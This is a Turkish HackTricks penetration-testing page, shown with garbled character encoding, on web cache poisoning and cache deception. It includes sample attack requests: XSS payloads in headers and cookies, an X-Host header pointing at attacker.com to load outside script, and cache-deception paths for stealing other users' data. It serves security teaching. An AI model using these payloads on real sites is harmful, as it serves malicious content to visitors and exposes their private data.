# Ã–nbellek Zehirlenmesi ve Ã–nbellek AldatmacasÄ±

<details>

<summary><strong>AWS hackleme konusunda sÄ±fÄ±rdan kahramana kadar Ã¶ÄŸrenin</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS KÄ±rmÄ±zÄ± TakÄ±m UzmanÄ±)</strong></a><strong>!</strong></summary>

HackTricks'Ä± desteklemenin diÄŸer yollarÄ±:

* **Åirketinizi HackTricks'te reklamÄ±nÄ± gÃ¶rmek istiyorsanÄ±z** veya **HackTricks'i PDF olarak indirmek istiyorsanÄ±z** [**ABONELÄ°K PLANLARI**]'na gÃ¶z atÄ±n (https://github.com/sponsors/carlospolop)!
* [**Resmi PEASS & HackTricks Ã¼rÃ¼nlerini**](https://peass.creator-spring.com) edinin
* [**PEASS Ailesi'ni**](https://opensea.io/collection/the-peass-family) keÅŸfedin, Ã¶zel [**NFT'lerimiz**](https://opensea.io/collection/the-peass-family) koleksiyonumuz
* **KatÄ±lÄ±n** ğŸ’¬ [**Discord grubuna**](https://discord.gg/hRep4RUj7f) veya [**telegram grubuna**](https://t.me/peass) veya bizi **Twitter** ğŸ¦ [**@carlospolopm**](https://twitter.com/hacktricks\_live)** takip edin.**
* **Hacking pÃ¼f noktalarÄ±nÄ±zÄ± paylaÅŸarak PR'lar gÃ¶ndererek** [**HackTricks**](https://github.com/carlospolop/hacktricks) ve [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github depolarÄ±na katkÄ±da bulunun.

</details>

<figure><img src="../.gitbook/assets/image (3) (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>

\
[**Trickest**](https://trickest.com/?utm\_campaign=hacktrics\&utm\_medium=banner\&utm\_source=hacktricks) kullanarak dÃ¼nyanÄ±n **en geliÅŸmiÅŸ topluluk araÃ§larÄ±** tarafÄ±ndan desteklenen **iÅŸ akÄ±ÅŸlarÄ±nÄ± kolayca oluÅŸturun ve otomatikleÅŸtirin**.\
BugÃ¼n EriÅŸim AlÄ±n:

{% embed url="https://trickest.com/?utm_campaign=hacktrics&utm_medium=banner&utm_source=hacktricks" %}

## Fark

> **Web Ã¶nbellek zehirlenmesi ile web Ã¶nbellek aldatmacasÄ± arasÄ±ndaki fark nedir?**
>
> * **Web Ã¶nbellek zehirlenmesinde**, saldÄ±rgan uygulamayÄ± Ã¶nbelleÄŸe bazÄ± kÃ¶tÃ¼ niyetli iÃ§erikler depolamaya zorlar ve bu iÃ§erik Ã¶nbellekten diÄŸer uygulama kullanÄ±cÄ±larÄ±na sunulur.
> * **Web Ã¶nbellek aldatmacasÄ±nda**, saldÄ±rgan uygulamayÄ± baÅŸka bir kullanÄ±cÄ±ya ait hassas iÃ§erikleri Ã¶nbelleÄŸe depolamaya zorlar ve ardÄ±ndan bu iÃ§eriÄŸi Ã¶nbellekten alÄ±r.

## Ã–nbellek Zehirlenmesi

Ã–nbellek zehirlenmesi, istemci tarafÄ± Ã¶nbelleÄŸini manipÃ¼le etmeyi amaÃ§layarak istemcileri beklenmeyen, kÄ±smi veya saldÄ±rganÄ±n kontrolÃ¼ altÄ±ndaki kaynaklarÄ± yÃ¼klemeye zorlar. Etki derecesi, kirli yanÄ±tÄ±n yalnÄ±zca Ã¶nbelleÄŸin kirletilme sÃ¼resi iÃ§inde sayfayÄ± ziyaret eden kullanÄ±cÄ±lara sunulmasÄ± nedeniyle etkilenen sayfanÄ±n popÃ¼lerliÄŸine baÄŸlÄ±dÄ±r.

Ã–nbellek zehirlenmesi saldÄ±rÄ±sÄ±nÄ±n gerÃ§ekleÅŸtirilmesi birkaÃ§ adÄ±mÄ± iÃ§erir:

1. **AnahtarlanmamÄ±ÅŸ GiriÅŸlerin TanÄ±mlanmasÄ±**: Bu, Ã¶nbelleÄŸe alÄ±nmasÄ± iÃ§in gerekli olmasa da sunucu tarafÄ±ndan dÃ¶ndÃ¼rÃ¼len yanÄ±tÄ± deÄŸiÅŸtirebilen parametrelerdir. Bu giriÅŸlerin tanÄ±mlanmasÄ±, Ã¶nbelleÄŸi manipÃ¼le etmek iÃ§in sÃ¶mÃ¼rÃ¼lebileceÄŸi iÃ§in Ã¶nemlidir.
2. **AnahtarlanmamÄ±ÅŸ GiriÅŸlerin SÃ¶mÃ¼rÃ¼lmesi**: AnahtarlanmamÄ±ÅŸ giriÅŸleri tanÄ±mladÄ±ktan sonra, bir sonraki adÄ±m bu parametreleri nasÄ±l kÃ¶tÃ¼ye kullanacaÄŸÄ±nÄ±zÄ± belirlemeyi iÃ§erir, bÃ¶ylece saldÄ±rganÄ±n yararÄ±na sunucunun yanÄ±tÄ±nÄ± deÄŸiÅŸtirebilir.
3. **Zehirli YanÄ±tÄ±n Ã–nbelleÄŸe AlÄ±nmasÄ±nÄ±n SaÄŸlanmasÄ±**: Son adÄ±m, manipÃ¼le edilmiÅŸ yanÄ±tÄ±n Ã¶nbelleÄŸe alÄ±ndÄ±ÄŸÄ±ndan emin olmaktÄ±r. Bu ÅŸekilde, Ã¶nbelleÄŸin kirletildiÄŸi sÄ±rada etkilenen sayfaya eriÅŸen herhangi bir kullanÄ±cÄ±, kirli yanÄ±tÄ± alacaktÄ±r.

### KeÅŸif: HTTP baÅŸlÄ±klarÄ±nÄ± kontrol edin

Genellikle bir yanÄ±tÄ±n **Ã¶nbelleÄŸe alÄ±ndÄ±ÄŸÄ±nda buna iÅŸaret eden bir baÅŸlÄ±k** olacaktÄ±r, bu postada dikkat etmeniz gereken baÅŸlÄ±klarÄ± kontrol edebilirsiniz: [**HTTP Ã–nbellek baÅŸlÄ±klarÄ±**](../network-services-pentesting/pentesting-web/special-http-headers.md#cache-headers).

### KeÅŸif: 400 kodunu Ã¶nbelleÄŸe alma

EÄŸer yanÄ±tÄ±n Ã¶nbelleÄŸe alÄ±ndÄ±ÄŸÄ±nÄ± dÃ¼ÅŸÃ¼nÃ¼yorsanÄ±z, **kÃ¶tÃ¼ bir baÅŸlÄ±kla istek gÃ¶ndermeyi** deneyebilirsiniz, bu da bir **durum kodu 400** ile yanÄ±tlanmalÄ±dÄ±r. Sonra isteÄŸi normal olarak eriÅŸmeyi deneyin ve yanÄ±tÄ±n **400 durum kodu** olduÄŸunu gÃ¶rdÃ¼ÄŸÃ¼nÃ¼zde, zayÄ±f olduÄŸunu bilirsiniz (ve hatta bir DoS gerÃ§ekleÅŸtirebilirsiniz).\
KÃ¶tÃ¼ yapÄ±landÄ±rÄ±lmÄ±ÅŸ bir baÅŸlÄ±k sadece `\:` olabilir.\
_Not: Bazen bu tÃ¼r durum kodlarÄ± Ã¶nbelleÄŸe alÄ±nmaz, bu yÃ¼zden bu test iÅŸe yaramaz olabilir._

### KeÅŸif: AnahtarlanmamÄ±ÅŸ giriÅŸleri tanÄ±mlayÄ±n ve deÄŸerlendirin

[**Param Miner**](https://portswigger.net/bappstore/17d2949a985c4b7ca092728dba871943) kullanarak sayfanÄ±n yanÄ±tÄ±nÄ± deÄŸiÅŸtirebilecek **parametreleri ve baÅŸlÄ±klarÄ± brute-force** edebilirsiniz. Ã–rneÄŸin, bir sayfa istemciye oradan betiÄŸi yÃ¼klemesi iÃ§in `X-Forwarded-For` baÅŸlÄ±ÄŸÄ±nÄ± kullanabilir.
```markup
<script type="text/javascript" src="//<X-Forwarded-For_value>/resources/js/tracking.js"></script>
```
### ZararlÄ± bir yanÄ±tÄ± arka uÃ§ sunucudan Ã§Ä±karÄ±n

Parametre/baÅŸlÄ±k belirlendikten sonra, nasÄ±l **temizlendiÄŸini** ve nerede yansÄ±tÄ±ldÄ±ÄŸÄ±nÄ± veya yanÄ±tÄ± nasÄ±l etkilediÄŸini kontrol edin. Herhangi bir ÅŸekilde kÃ¶tÃ¼ye kullanabilir misiniz (XSS gerÃ§ekleÅŸtirebilir veya sizin kontrolÃ¼nÃ¼zdeki bir JS kodu yÃ¼kleyebilir misiniz? DoS gerÃ§ekleÅŸtirebilir misiniz?...)

### YanÄ±tÄ± Ã¶nbelleÄŸe alÄ±n

KÃ¶tÃ¼ye kullanÄ±labilecek **sayfayÄ±**, hangi **parametreyi/baÅŸlÄ±ÄŸÄ±** kullanacaÄŸÄ±nÄ±zÄ± ve nasÄ±l **kÃ¶tÃ¼ye kullanacaÄŸÄ±nÄ±zÄ±** belirledikten sonra, sayfayÄ± Ã¶nbelleÄŸe almanÄ±z gerekmektedir. Ã–nbelleÄŸe alÄ±nmaya Ã§alÄ±ÅŸtÄ±ÄŸÄ±nÄ±z kaynaÄŸa baÄŸlÄ± olarak, bu biraz zaman alabilir, birkaÃ§ saniye boyunca denemek zorunda kalabilirsiniz.\
YanÄ±tta bulunan **`X-Cache`** baÅŸlÄ±ÄŸÄ±, isteÄŸin Ã¶nbelleÄŸe alÄ±nmadÄ±ÄŸÄ± durumlarda **`miss`** deÄŸerine sahip olabileceÄŸi gibi, Ã¶nbelleÄŸe alÄ±ndÄ±ÄŸÄ±nda **`hit`** deÄŸerine sahip olabilir.\
**`Cache-Control`** baÅŸlÄ±ÄŸÄ± da ilginÃ§ olabilir, bir kaynaÄŸÄ±n Ã¶nbelleÄŸe alÄ±nÄ±p alÄ±nmadÄ±ÄŸÄ±nÄ± ve kaynaÄŸÄ±n bir sonraki sefer ne zaman Ã¶nbelleÄŸe alÄ±nacaÄŸÄ±nÄ± bilmek iÃ§in: `Cache-Control: public, max-age=1800`\
BaÅŸka bir ilginÃ§ baÅŸlÄ±k ise **`Vary`**. Bu baÅŸlÄ±k genellikle Ã¶nbellek anahtarÄ± olarak kabul edilmeyen ek baÅŸlÄ±klarÄ± belirtmek iÃ§in kullanÄ±lÄ±r. Bu nedenle, saldÄ±rgan, hedef aldÄ±ÄŸÄ± kurbanÄ±n `User-Agent`'Ä±nÄ± biliyorsa, o belirli `User-Agent` kullanan kullanÄ±cÄ±lar iÃ§in Ã¶nbelleÄŸi zehirleyebilir.\
Ã–nbellekle ilgili bir baÅŸka baÅŸlÄ±k ise **`Age`**. Bu, nesnenin proxy Ã¶nbelleÄŸinde kaÃ§ saniye boyunca bulunduÄŸunu tanÄ±mlar.

Bir isteÄŸi Ã¶nbelleÄŸe alÄ±rken, kullanÄ±lan baÅŸlÄ±klara **dikkat edin** Ã§Ã¼nkÃ¼ bunlardan bazÄ±larÄ± beklenmedik ÅŸekilde **anahtar** olarak kullanÄ±labilir ve **kurbanÄ±n aynÄ± baÅŸlÄ±ÄŸÄ± kullanmasÄ± gerekebilir**. Her zaman **farklÄ± tarayÄ±cÄ±larla** bir Ã–nbellek Zehirlenmesini **test edin** ve Ã§alÄ±ÅŸÄ±p Ã§alÄ±ÅŸmadÄ±ÄŸÄ±nÄ± kontrol edin.

## SÃ¶mÃ¼rÃ¼ Ã–rnekleri

### En kolay Ã¶rnek

`X-Forwarded-For` gibi bir baÅŸlÄ±k yanÄ±tta temizlenmeden yansÄ±tÄ±lÄ±yor.\
Temel bir XSS yÃ¼kÃ¼ gÃ¶nderebilir ve Ã¶nbelleÄŸi zehirleyebilirsiniz, bÃ¶ylece sayfaya eriÅŸen herkes XSS'e maruz kalacaktÄ±r:
```markup
GET /en?region=uk HTTP/1.1
Host: innocent-website.com
X-Forwarded-Host: a."><script>alert(1)</script>"
```
### Web Ã¶nbellek zehirlenmesini kullanarak Ã§erez iÅŸleme aÃ§Ä±klarÄ±nÄ± sÃ¶mÃ¼rme

Ã‡erezler ayrÄ±ca bir sayfanÄ±n yanÄ±tÄ±nda yansÄ±tÄ±labilmektedir. Ã–rneÄŸin bir XSS oluÅŸturmak iÃ§in bunu istismar edebilirseniz, kÃ¶tÃ¼ niyetli Ã¶nbellek yanÄ±tÄ±nÄ± yÃ¼kleyen birkaÃ§ istemci Ã¼zerinde XSS'i sÃ¶mÃ¼rebilirsiniz.
```markup
GET / HTTP/1.1
Host: vulnerable.com
Cookie: session=VftzO7ZtiBj5zNLRAuFpXpSQLjS4lBmU; fehost=asd"%2balert(1)%2b"
```
### API anahtarÄ±nÄ± Ã§almak iÃ§in yol gezinimini kullanarak Ã¶nbellek zehirlenmesi <a href="#using-multiple-headers-to-exploit-web-cache-poisoning-vulnerabilities" id="using-multiple-headers-to-exploit-web-cache-poisoning-vulnerabilities"></a>

[**Bu yazÄ±da aÃ§Ä±klandÄ±ÄŸÄ± gibi**](https://nokline.github.io/bugbounty/2024/02/04/ChatGPT-ATO.html), URL'yi `https://chat.openai.com/share/%2F..%2Fapi/auth/session?cachebuster=123` gibi kullanarak bir OpenAI API anahtarÄ±nÄ±n Ã§alÄ±nabilmesinin mÃ¼mkÃ¼n olduÄŸu Ã§Ã¼nkÃ¼ `/share/*` ile eÅŸleÅŸen her ÅŸey, Cloudflare'Ä±n URL'yi normalize etmeden Ã¶nbelleÄŸe alacaÄŸÄ± belirtilmiÅŸtir, bu da isteÄŸin web sunucusuna ulaÅŸtÄ±ÄŸÄ±nda yapÄ±ldÄ±.

### Web Ã¶nbellek zehirlenmesi aÃ§Ä±klarÄ±nÄ± sÃ¶mÃ¼rmek iÃ§in birden fazla baÅŸlÄ±k kullanma <a href="#using-multiple-headers-to-exploit-web-cache-poisoning-vulnerabilities" id="using-multiple-headers-to-exploit-web-cache-poisoning-vulnerabilities"></a>

Bazen bir Ã¶nbelleÄŸi kÃ¶tÃ¼ye kullanabilmek iÃ§in **birkaÃ§ anahtarsÄ±z giriÅŸi sÃ¶mÃ¼rmeniz gerekebilir**. Ã–rneÄŸin, `X-Forwarded-Host`'u sizin kontrol ettiÄŸiniz bir alan adÄ±na ve `X-Forwarded-Scheme`'i `http` olarak ayarlarsanÄ±z, bir **AÃ§Ä±k yÃ¶nlendirme** bulabilirsiniz. **Sunucu** tÃ¼m **HTTP** isteklerini **HTTPS'ye yÃ¶nlendiriyorsa** ve yÃ¶nlendirme iÃ§in alan adÄ± olarak `X-Forwarded-Scheme` baÅŸlÄ±ÄŸÄ±nÄ± kullanÄ±yorsa, yÃ¶nlendirmenin nereye yapÄ±ldÄ±ÄŸÄ±nÄ± kontrol edebilirsiniz.
```markup
GET /resources/js/tracking.js HTTP/1.1
Host: acc11fe01f16f89c80556c2b0056002e.web-security-academy.net
X-Forwarded-Host: ac8e1f8f1fb1f8cb80586c1d01d500d3.web-security-academy.net/
X-Forwarded-Scheme: http
```
### SÄ±nÄ±rlÄ± `Vary` baÅŸlÄ±ÄŸÄ± ile istismar

EÄŸer yanÄ±tta **`User-Agent`**'Ä± iÅŸaret eden **`Vary`** baÅŸlÄ±ÄŸÄ± kullanÄ±lÄ±yorsa ve **`X-Host`** baÅŸlÄ±ÄŸÄ±nÄ±n bir JS kaynaÄŸÄ±nÄ± yÃ¼klemek iÃ§in **alan adÄ±** olarak kullanÄ±ldÄ±ÄŸÄ±nÄ± bulduysanÄ±z, kurbanÄ±n User-Agent'Ä±nÄ± dÄ±ÅŸa Ã§Ä±karmak ve bu kullanÄ±cÄ± ajanÄ±nÄ± kullanarak Ã¶nbelleÄŸi zehirlemek iÃ§in bir yol bulmanÄ±z gerekecektir:
```markup
GET / HTTP/1.1
Host: vulnerbale.net
User-Agent: THE SPECIAL USER-AGENT OF THE VICTIM
X-Host: attacker.com
```
### HTTP Ä°steÄŸi KaÃ§Ä±rarak HTTP Ã–nbellek Zehirlenmesini SÃ¶mÃ¼rme

[HTTP Ä°steÄŸi KaÃ§Ä±rarak Web Ã–nbellek Zehirlenmesi Yapma](http-request-smuggling/#using-http-request-smuggling-to-perform-web-cache-poisoning) hakkÄ±nda buradan bilgi edinin.

### Web Ã–nbellek Zehirlenmesi iÃ§in Otomatik Testler

[Web Ã–nbellek Zafiyet TarayÄ±cÄ±sÄ±](https://github.com/Hackmanit/Web-Cache-Vulnerability-Scanner) web Ã¶nbellek zehirlenmesi iÃ§in otomatik testler yapmak iÃ§in kullanÄ±labilir. BirÃ§ok farklÄ± teknik destekler ve yÃ¼ksek derecede Ã¶zelleÅŸtirilebilir.

Ã–rnek kullanÄ±m: `wcvs -u example.com`

<figure><img src="../.gitbook/assets/image (3) (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>

\
[**Trickest**](https://trickest.com/?utm\_campaign=hacktrics\&utm\_medium=banner\&utm\_source=hacktricks) kullanarak dÃ¼nyanÄ±n en geliÅŸmiÅŸ topluluk araÃ§larÄ± tarafÄ±ndan desteklenen **otomatik iÅŸ akÄ±ÅŸlarÄ±** oluÅŸturun ve otomatikleÅŸtirin.\
BugÃ¼n EriÅŸim AlÄ±n:

{% embed url="https://trickest.com/?utm_campaign=hacktrics&utm_medium=banner&utm_source=hacktricks" %}

## Zafiyetli Ã–rnekler

### Apache Trafik Sunucusu ([CVE-2021-27577](https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2021-27577))

ATS, URL iÃ§indeki parÃ§ayÄ± kaldÄ±rmadan iletmiÅŸ ve Ã¶nbellek anahtarÄ±nÄ± sadece ana bilgisayar, yol ve sorgu kullanarak oluÅŸturmuÅŸ (parÃ§ayÄ± yok sayarak). Bu nedenle, `/#/../?r=javascript:alert(1)` isteÄŸi, `/#/../?r=javascript:alert(1)` olarak arka uca gÃ¶nderildi ve Ã¶nbellek anahtarÄ± iÃ§inde yÃ¼k bulunmuyordu, sadece ana bilgisayar, yol ve sorgu bulunuyordu.

### GitHub CP-DoS

Ä°Ã§erik tÃ¼rÃ¼ baÅŸlÄ±ÄŸÄ±nda kÃ¶tÃ¼ bir deÄŸer gÃ¶ndermek, Ã¶nbelleÄŸe alÄ±nmÄ±ÅŸ bir 405 yanÄ±tÄ±nÄ± tetikledi. Ã–nbellek anahtarÄ± Ã§erez iÃ§erdiÄŸi iÃ§in yalnÄ±zca kimlik doÄŸrulama yapÄ±lmamÄ±ÅŸ kullanÄ±cÄ±lara saldÄ±rÄ± yapmak mÃ¼mkÃ¼ndÃ¼.

### GitLab + GCP CP-DoS

GitLab, statik iÃ§eriÄŸi depolamak iÃ§in GCP kovalarÄ±nÄ± kullanÄ±r. **GCP KovalarÄ±**, **`x-http-method-override`** baÅŸlÄ±ÄŸÄ±nÄ± destekler. Bu nedenle, `x-http-method-override: HEAD` baÅŸlÄ±ÄŸÄ±nÄ± gÃ¶ndermek ve Ã¶nbelleÄŸi boÅŸ bir yanÄ±t gÃ¶vdesi dÃ¶ndÃ¼rmek mÃ¼mkÃ¼ndÃ¼. AyrÄ±ca `PURGE` yÃ¶ntemini de destekleyebilir.

### Rack Ara YazÄ±lÄ±mÄ± (Ruby on Rails)

Ruby on Rails uygulamalarÄ±nda genellikle Rack ara yazÄ±lÄ±mÄ± kullanÄ±lÄ±r. Rack kodunun amacÄ±, **`x-forwarded-scheme`** baÅŸlÄ±ÄŸÄ±nÄ±n deÄŸerini almak ve isteÄŸin ÅŸemasÄ± olarak ayarlamaktÄ±r. `x-forwarded-scheme: http` baÅŸlÄ±ÄŸÄ± gÃ¶nderildiÄŸinde, aynÄ± konuma yÃ¶nlendirilen bir 301 yÃ¶nlendirmesi gerÃ§ekleÅŸir, bu da potansiyel olarak o kaynaÄŸa bir Hizmet Reddi (DoS) neden olabilir. AyrÄ±ca, uygulama `X-forwarded-host` baÅŸlÄ±ÄŸÄ±nÄ± kabul edebilir ve kullanÄ±cÄ±larÄ± belirtilen ana bilgisayara yÃ¶nlendirebilir. Bu davranÄ±ÅŸ, saldÄ±rganÄ±n sunucusundan JavaScript dosyalarÄ±nÄ± yÃ¼klemesine neden olabilir ve gÃ¼venlik riski oluÅŸturabilir.

### 403 ve Depolama KovalarÄ±

Cloudflare Ã¶nceden 403 yanÄ±tlarÄ±nÄ± Ã¶nbelleÄŸe alÄ±yordu. YanlÄ±ÅŸ Yetkilendirme baÅŸlÄ±klarÄ± ile S3 veya Azure Depolama BloklarÄ±na eriÅŸmeye Ã§alÄ±ÅŸmak, Ã¶nbelleÄŸe alÄ±nan bir 403 yanÄ±tÄ±na neden olurdu. Cloudflare 403 yanÄ±tlarÄ±nÄ± Ã¶nbelleÄŸe almaktan vazgeÃ§miÅŸ olsa da, bu davranÄ±ÅŸ diÄŸer proxy hizmetlerinde hala mevcut olabilir.

### AnahtarlÄ± Parametreler Enjekte Etme

Ã–nbellekler genellikle Ã¶nbellek anahtarÄ±nda belirli GET parametrelerini iÃ§erir. Ã–rneÄŸin, Fastly'nin Varnish'i isteklerde `size` parametresini Ã¶nbelleÄŸe alÄ±rdÄ±. Ancak, URL kodlanmÄ±ÅŸ bir sÃ¼rÃ¼mÃ¼ (Ã¶rneÄŸin, `siz%65`) yanlÄ±ÅŸ bir deÄŸerle birlikte gÃ¶nderildiÄŸinde, Ã¶nbellek anahtarÄ± doÄŸru `size` parametresini kullanarak oluÅŸturulurdu. Ancak, arka uÃ§ URL kodlanmÄ±ÅŸ parametreyi iÅŸlerdi. Ä°kinci `size` parametresini URL kodlamak, Ã¶nbellek tarafÄ±ndan atlanmasÄ±na ancak arka uÃ§ tarafÄ±ndan kullanÄ±lmasÄ±na neden olurdu. Bu parametreye 0 deÄŸeri atamak, Ã¶nbelleÄŸe alÄ±nabilir bir 400 HatalÄ± Ä°stek hatasÄ± sonucu verirdi.

### KullanÄ±cÄ± AjanÄ± KurallarÄ±

BazÄ± geliÅŸtiriciler, sunucu yÃ¼kÃ¼nÃ¼ yÃ¶netmek iÃ§in FFUF veya Nuclei gibi yÃ¼ksek trafikli araÃ§larÄ±n kullanÄ±cÄ± ajanlarÄ±yla eÅŸleÅŸen istekleri engeller. Ä°ronik bir ÅŸekilde, bu yaklaÅŸÄ±m Ã¶nbellek zehirlenmesi ve DoS gibi zafiyetlere neden olabilir.

### YasadÄ±ÅŸÄ± BaÅŸlÄ±k AlanlarÄ±

[RFC7230](https://datatracker.ietf.mrg/doc/html/rfc7230) baÅŸlÄ±k adlarÄ±nda kabul edilebilir karakterleri belirtir. Belirtilen **tchar** aralÄ±ÄŸÄ±nÄ±n dÄ±ÅŸÄ±ndaki karakterleri iÃ§eren baÅŸlÄ±klar ideal olarak bir 400 HatalÄ± Ä°stek yanÄ±tÄ± tetiklemelidir. Uygulamada sunucular her zaman bu standartlara uymazlar. Akamai gibi belirgin bir Ã¶rnek, geÃ§ersiz karakterler iÃ§eren baÅŸlÄ±klarÄ± iletir ve `cache-control` baÅŸlÄ±ÄŸÄ± mevcut olmadÄ±ÄŸÄ± sÃ¼rece herhangi bir 400 hatasÄ±nÄ± Ã¶nbelleÄŸe alÄ±r. GeÃ§erli olmayan bir karakter iÃ§eren bir baÅŸlÄ±k gÃ¶ndermenin, Ã¶rneÄŸin `\`, Ã¶nbelleÄŸe alÄ±nabilir bir 400 HatalÄ± Ä°stek hatasÄ± sonucu vereceÄŸi bir aÃ§Ä±klanabilir model belirlendi.

### Yeni baÅŸlÄ±klar bulma

[https://gist.github.com/iustin24/92a5ba76ee436c85716f003dda8eecc6](https://gist.github.com/iustin24/92a5ba76ee436c85716f003dda8eecc6)

## Ã–nbellek AldatmacasÄ±

Ã–nbellek AldatmacasÄ±nÄ±n amacÄ±, istemcilerin **duyarlÄ± bilgileriyle birlikte Ã¶nbelleÄŸe kaydedilecek kaynaklarÄ± yÃ¼klemesini saÄŸlamaktÄ±r**.

Ã–ncelikle **.css**, **.js**, **.png** gibi **uzantÄ±larÄ±n** genellikle **Ã¶nbelleÄŸe kaydedilmesi** iÃ§in **ayarlandÄ±ÄŸÄ±nÄ±** unutmayÄ±n. Bu nedenle, `www.example.com/profile.php/nonexistent.js`'ye eriÅŸirseniz, Ã¶nbellek muhtemelen yanÄ±tÄ± saklayacaktÄ±r Ã§Ã¼nkÃ¼ **.js** **uzantÄ±sÄ±nÄ±** gÃ¶rÃ¼r. Ancak, **uygulama** _www.example.com/profile.php_'de saklanan **duyarlÄ±** kullanÄ±cÄ± iÃ§eriÄŸiyle **yeniden oynuyorsa**, diÄŸer kullanÄ±cÄ±lardan bu iÃ§erikleri **Ã§alabilirsiniz**.

Test edilecek diÄŸer ÅŸeyler:

* _www.example.com/profile.php/.js_
* _www.example.com/profile.php/.css_
* _www.example.com/profile.php/test.js_
* _www.example.com/profile.php/../test.js_
* _www.example.com/profile.php/%2e%2e/test.js_
* _`.avif` gibi daha az bilinen uzantÄ±larÄ± kullanÄ±n_

Bu konuda Ã§ok aÃ§Ä±k bir Ã¶rnek, bu yazÄ±da bulunabilir: [https://hackerone.com/reports/593712](https://hackerone.com/reports/593712).\
Ã–rnekte, _http://www.example.com/home.php/non-existent.css_ gibi mevcut olmayan bir sayfa yÃ¼klerseniz, Ã¶nceki eriÅŸen kullanÄ±cÄ±larÄ±n **duyarlÄ± bilgileriyle** _http://www.example.com/home.php_'nin iÃ§eriÄŸi geri dÃ¶necek ve Ã¶nbellek sunucusu sonucu kaydedecektir.\
ArdÄ±ndan, **saldÄ±rgan**, kendi tarayÄ±cÄ±sÄ±nda _http://www.example.com/home.php/non-existent.css_'e eriÅŸebilir ve Ã¶nceki eriÅŸen kullanÄ±cÄ±larÄ±n **gizli bilgilerini** gÃ¶zlemleyebilir.

Ã–nbellek **proxy**'sinin dosyalarÄ± **iÃ§erik tÃ¼rÃ¼ne** gÃ¶re deÄŸil, dosya uzantÄ±sÄ±na gÃ¶re Ã¶nbelleÄŸe alacak ÅŸekilde **ayarlanmÄ±ÅŸ** olmasÄ± gerektiÄŸini unutmayÄ±n (_.css_). Ã–rneÄŸin _http://www.example.com/home.php/non-existent.css_ Ã¶nbellek anahtarÄ±nda `text/css` mime tÃ¼rÃ¼ yerine `text/html` iÃ§erik tÃ¼rÃ¼ne sahip olacaktÄ±r (beklenen _.css_ dosyasÄ± iÃ§in).

[HTTP Ä°steÄŸi KaÃ§Ä±rarak Web Ã–nbellek AldatmacalarÄ± SÃ¶mÃ¼rme](http-request-smuggling/#using-http-request-smuggling-to-perform-web-cache-deception) hakkÄ±nda buradan bilgi edinin.

## Otomatik AraÃ§lar

* [**toxicache**](https://github.com/xhzeem/toxicache): Belirli URL'lerde web Ã¶nbellek zehirlenmesi zafiyetlerini bulmak ve birden fazla enjeksiyon tekniÄŸini test etmek iÃ§in Golang tarayÄ±cÄ±.

## Referanslar

* [https://portswigger.net/web-security/web-cache-poisoning](https://portswigger.net/web-security/web-cache-poisoning)
* [https://portswigger.net/web-security/web-cache-poisoning/exploiting#using-web-cache-poisoning-to-exploit-cookie-handling-vulnerabilities](https://portswigger.net/web-security/web-cache-poisoning/exploiting#using-web-cache-poisoning-to-exploit-cookie-handling-vulnerabilities)
* [https://hackerone.com/reports/593712](https://hackerone.com/reports/593712)
* [https://youst.in/posts/cache-poisoning-at-scale/](https://youst.in/posts/cache-poisoning-at-scale/)
* [https://bxmbn.medium.com/how-i-test-for-web-cache-vulnerabilities-tips-and-tricks-9b138da08ff9](https://bxmbn.medium.com/how-i-test-for-web-cache-vulnerabilities-tips-and-tricks-9b138da08ff9)
* [https://www.linkedin.com/pulse/how-i-hacked-all-zendesk-sites-265000-site-one-line-abdalhfaz/](https://www.linkedin.com/pulse/how-i-hacked-all-zendesk-sites-265000-site-one-line-abdalhfaz/)

<figure><img src="../.gitbook/assets/image (3) (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>

\
[**Trickest**](https://trickest.com/?utm\_campaign=hacktrics\&utm\_medium=banner\&utm\_source=hacktricks) kullanarak dÃ¼nyanÄ±n en geliÅŸmiÅŸ topluluk araÃ§larÄ± tarafÄ±ndan desteklenen **otomatik iÅŸ akÄ±ÅŸlarÄ±** oluÅŸturun ve otomatikleÅŸtirin.\
BugÃ¼n EriÅŸim AlÄ±n:

{% embed url="https://trickest.com/?utm_campaign=hacktrics&utm_medium=banner&utm_source=hacktricks" %}

<details>
<summary><strong>AWS hacklemeyi sÄ±fÄ±rdan kahramana Ã¶ÄŸrenin</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>

HackTricks'Ä± desteklemenin diÄŸer yollarÄ±:

* **Åirketinizi HackTricks'te reklamÄ±nÄ± gÃ¶rmek istiyorsanÄ±z** veya **HackTricks'i PDF olarak indirmek istiyorsanÄ±z** [**ABONELÄ°K PLANLARI**]'na gÃ¶z atÄ±n (https://github.com/sponsors/carlospolop)!
* [**Resmi PEASS & HackTricks Ã¼rÃ¼nlerini alÄ±n**](https://peass.creator-spring.com)
* [**PEASS Ailesi'ni**](https://opensea.io/collection/the-peass-family) keÅŸfedin, Ã¶zel [**NFT'lerimiz**](https://opensea.io/collection/the-peass-family) koleksiyonumuz
* **KatÄ±lÄ±n** ğŸ’¬ [**Discord grubuna**](https://discord.gg/hRep4RUj7f) veya [**telegram grubuna**](https://t.me/peass) veya bizi **Twitter** ğŸ¦ [**@carlospolopm**](https://twitter.com/hacktricks\_live)** takip edin.**
* **HackTricks** ve [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github depolarÄ±na PR gÃ¶ndererek hackleme hilelerinizi paylaÅŸÄ±n.
